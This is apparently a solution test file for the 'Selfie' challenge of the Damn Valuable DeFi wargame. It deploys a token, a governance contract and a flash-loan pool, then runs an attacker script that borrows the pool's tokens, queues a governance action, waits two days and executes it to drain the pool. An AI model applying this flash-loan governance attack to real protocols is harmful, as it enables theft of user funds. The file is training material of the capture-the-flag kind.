const { ether, time } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
const attackSelfiePool = contract.fromArtifact('attackSelfiePool');
const SelfiePool = contract.fromArtifact('SelfiePool');
const SimpleGovernance = contract.fromArtifact('SimpleGovernance');

const { expect } = require('chai');

describe('[Challenge] Selfie', function() {
	const [ deployer, attacker, ...otherAccounts ] = accounts;

	const TOKEN_INITIAL_SUPPLY = ether('2000000');
	const TOKENS_IN_POOL = ether('1500000');

	before(async function() {
		/** SETUP SCENARIO */
		this.token = await DamnValuableTokenSnapshot.new(TOKEN_INITIAL_SUPPLY, { from: deployer });
		this.governance = await SimpleGovernance.new(this.token.address, { from: deployer });
		//Flasloan pool.
		this.pool = await SelfiePool.new(this.token.address, this.governance.address, { from: deployer });
		// Transfer toksn to flashloan pool..
		await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
		//Check flashloan pool contains the amount of tokens.
		expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(TOKENS_IN_POOL);
	});

	it('Exploit', async function() {
		/** YOUR EXPLOIT GOES HERE */
		const helper = await attackSelfiePool.new({ from: attacker });
		await helper.attack(this.pool.address, TOKENS_IN_POOL.toString(), { from: attacker });
		//wait for 2 days delay before executing the action.
		await time.increase(time.duration.days(2));
		//Vote to drain the funds with governance
		await this.governance.executeAction(1, { from: attacker });
	});

	after(async function() {
		/** SUCCESS CONDITIONS */
		// Attaker get all the tokens in pool.
		expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(TOKENS_IN_POOL);
		// pool doesn't contain any tokens.
		expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal('0');
	});
});
